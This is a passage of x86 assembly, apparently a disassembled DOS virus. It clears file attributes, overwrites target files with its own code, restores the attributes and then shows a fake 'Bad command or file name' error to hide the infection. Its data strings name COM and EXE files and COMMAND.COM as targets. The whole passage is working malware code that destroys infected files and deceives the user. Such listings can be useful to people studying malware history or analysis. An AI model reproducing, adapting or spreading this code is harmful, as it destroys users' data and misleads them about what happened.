                mov     ax,4300h
                int     21h                     ; DOS Services  ah=function 43h
                                                ;  get/set file attrb, nam@ds:dx
                jc      loc_36                  ; Jump if carry Set
                mov     es,cx
                mov     ax,4301h
                xor     cx,cx                   ; Zero register
                int     21h                     ; DOS Services  ah=function 43h
                                                ;  get/set file attrb, nam@ds:dx
                jc      loc_36                  ; Jump if carry Set
                mov     ah,3Ch                  ; '<'
                int     21h                     ; DOS Services  ah=function 3Ch
                                                ;  create/truncate file @ ds:dx
                push    ds
                push    dx
                push    cs
                pop     ds
                mov     dx,offset ds:[100h]     ; (8344:0100=0E8h)
                mov     bx,ax
                mov     ah,40h                  ; '@'
                mov     cx,9
                add     cx,bp
                int     21h                     ; DOS Services  ah=function 40h
                                                ;  write file cx=bytes, to ds:dx
                pop     dx
                pop     ds
                mov     cx,es
                mov     ax,4301h
                int     21h                     ; DOS Services  ah=function 43h
                                                ;  get/set file attrb, nam@ds:dx
loc_36:
                push    cs
                pop     ds
                mov     ah,9
                mov     dx,offset data_15+25h   ; (8344:0521=0)
                add     dx,bp
                int     21h                     ; DOS Services  ah=function 09h
                                                ;  display char string at ds:dx
                mov     ah,4Ch                  ; 'L'
                int     21h                     ; DOS Services  ah=function 4Ch
                                                ;  terminate with al=return code
data_9          db      0
loc_37:
                call    sub_29                  ; (04F6)
                dec     bp
                jnz     $+74h                   ; Jump if not zero
                jo      $+6Ah                   ; Jump if overflow=1
                jns     loc_37                  ; Jump if not sign
sub_27          endp
  
  
;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;                              SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ
  
sub_29          proc    near
                popf                            ; Pop flags
                add     [bx+si],al
                add     bl,[si+0]
data_15         db      '*.*', 0
                db      '\^^^^^^^^', 0
                db      'COMMAND.COM', 0
                db      '*.COM', 0
                db      '*.EXE', 0
                db      'Bad command or file name', 0Dh, 0Ah
                db      '$'
                db      6
data_21         db      0
sub_29          endp
  
  
seg_a           ends
  
  
  
                end     start
